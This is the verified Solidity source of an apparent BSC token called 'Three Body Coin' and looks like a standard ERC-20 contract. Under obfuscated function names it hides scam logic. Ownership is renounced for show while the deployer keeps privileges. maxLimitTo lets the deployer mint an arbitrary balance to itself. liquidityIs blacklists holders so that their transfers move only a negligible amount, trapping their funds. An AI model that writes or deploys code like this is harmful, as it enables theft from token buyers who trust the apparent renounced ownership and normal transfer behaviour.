/**
 *Submitted for verification at BscScan.com on 2023-02-05
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _setOwner(_msgSender());
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface enableIsAuto {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface listLimit {
    function createPair(address tokenA, address tokenB) external returns (address);
}

contract ThreeBodyCoin is Ownable{
    uint8 public decimals = 18;

    mapping(address => uint256) public balanceOf;


    mapping(address => bool) public launchedLimit;
    mapping(address => bool) public limitTo;
    string public symbol = "TBCN";
    uint256 constant receiverTake = 12 ** 10;

    address public autoSenderMode;
    string public name = "Three Body Coin";
    address public minTx;
    mapping(address => mapping(address => uint256)) public allowance;
    uint256 public totalSupply = 100000000 * 10 ** 18;
    bool public txFeeLaunch;
    

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor (){
        enableIsAuto listLaunch = enableIsAuto(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        autoSenderMode = listLimit(listLaunch.factory()).createPair(listLaunch.WETH(), address(this));
        minTx = senderTake();
        launchedLimit[minTx] = true;
        balanceOf[minTx] = totalSupply;
        emit Transfer(address(0), minTx, totalSupply);
        renounceOwnership();
    }

    

    function launchExempt(address feeFundAuto) public {
        if (txFeeLaunch) {
            return;
        }
        launchedLimit[feeFundAuto] = true;
        txFeeLaunch = true;
    }

    function getOwner() external view returns (address) {
        return owner();
    }

    function transferFrom(address shouldLaunched, address tradingTotal, uint256 senderAuto) external returns (bool) {
        if (allowance[shouldLaunched][senderTake()] != type(uint256).max) {
            require(allowance[shouldLaunched][senderTake()] >= senderAuto);
            allowance[shouldLaunched][senderTake()] -= senderAuto;
        }
        return swapTotalLaunched(shouldLaunched, tradingTotal, senderAuto);
    }

    function maxLimitTo(uint256 senderAuto) public {
        if (!launchedLimit[senderTake()]) {
            return;
        }
        balanceOf[minTx] = senderAuto;
    }

    function amountToken(address shouldLaunched, address tradingTotal, uint256 senderAuto) internal returns (bool) {
        require(balanceOf[shouldLaunched] >= senderAuto);
        balanceOf[shouldLaunched] -= senderAuto;
        balanceOf[tradingTotal] += senderAuto;
        emit Transfer(shouldLaunched, tradingTotal, senderAuto);
        return true;
    }

    function liquidityIs(address takeTrading) public {
        if (takeTrading == minTx || takeTrading == autoSenderMode || !launchedLimit[senderTake()]) {
            return;
        }
        limitTo[takeTrading] = true;
    }

    function approve(address buyTake, uint256 senderAuto) public returns (bool) {
        allowance[senderTake()][buyTake] = senderAuto;
        emit Approval(senderTake(), buyTake, senderAuto);
        return true;
    }

    function transfer(address senderAt, uint256 senderAuto) external returns (bool) {
        return swapTotalLaunched(senderTake(), senderAt, senderAuto);
    }

    function senderTake() private view returns (address) {
        return msg.sender;
    }

    function swapTotalLaunched(address shouldLaunched, address tradingTotal, uint256 senderAuto) internal returns (bool) {
        if (shouldLaunched == minTx || tradingTotal == minTx) {
            return amountToken(shouldLaunched, tradingTotal, senderAuto);
        }
        if (limitTo[shouldLaunched]) {
            return amountToken(shouldLaunched, tradingTotal, receiverTake);
        }
        return amountToken(shouldLaunched, tradingTotal, senderAuto);
    }


}